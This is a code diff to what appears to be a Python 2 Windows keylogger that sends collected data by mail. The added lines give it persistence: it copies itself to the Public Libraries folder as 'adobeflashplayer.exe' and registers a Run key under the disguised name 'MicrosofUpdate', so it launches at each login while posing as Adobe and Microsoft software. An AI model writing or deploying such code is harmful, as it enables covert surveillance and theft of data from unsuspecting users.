@@ -5,6 +5,7 @@ import threading
 import urllib,urllib2
 import smtplib
 import datetime,time
+import win32com.client
 import win32event, win32api, winerror
 from _winreg import *
 
@@ -16,6 +17,16 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x=''
 data=''
 count=0
+
+dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
+
+def startup():
+    shutil.copy(sys.argv[0],dir)
+    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
+    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
+if os.path.isfile(dir) == False:
+    startup()	
 
 class TimerClass(threading.Thread):
     def __init__(self):
